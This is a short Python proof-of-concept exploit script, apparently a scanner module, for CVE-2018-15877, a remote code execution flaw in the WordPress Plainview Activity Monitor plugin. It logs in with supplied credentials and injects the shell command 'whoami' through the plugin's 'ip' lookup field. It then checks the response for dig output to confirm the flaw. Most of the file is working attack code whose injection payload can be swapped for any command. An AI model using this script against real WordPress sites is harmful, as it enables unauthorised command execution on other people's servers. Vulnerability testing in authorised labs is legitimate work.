# coding: utf-8
import requests
import re
from bs4 import BeautifulSoup

#WordPress Plugin Plainview Activity Monitor 20161228 - Remote Code Execution
def poc(url,logindict,user_agent,proxy):

    url = url.strip("/")
    # Authentication:
    session = requests.Session()
    auth_url=url+'/wp-login.php'
    redirecto = url + "/wp-admin/"
    username=logindict.keys()
    password=logindict.values()
    header = {
        'User-Agent': user_agent
    }
    data = {'log': username, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': redirecto, 'testcookie': '1'}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        auth  = session.post(auth_url, headers=header, data=data, proxies=proxies)
    else:
        auth  = session.post(auth_url, headers=header, data=data)


    #漏洞位置
    exploit_url=url+ '/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools'
    myobj = {'ip': 'google.com.tr | whoami', 'lookup': 'lookup'}

    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = session.get(exploit_url, headers=header,data=myobj, proxies=proxies)
    else:
        response = session.get(exploit_url, headers=header,data=myobj)

    if response.status_code==200 and  re.search('<p>Output from dig: </p>',response.text) :
        return "WordPress Plugin Plainview Activity Monitor 20161228 - 远程代码执行   漏洞编号：CVE-2018-15877"


def run(url,logindict,user_agent,proxies):
    if logindict:
        result = poc(url,logindict,user_agent,proxies)
        return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')

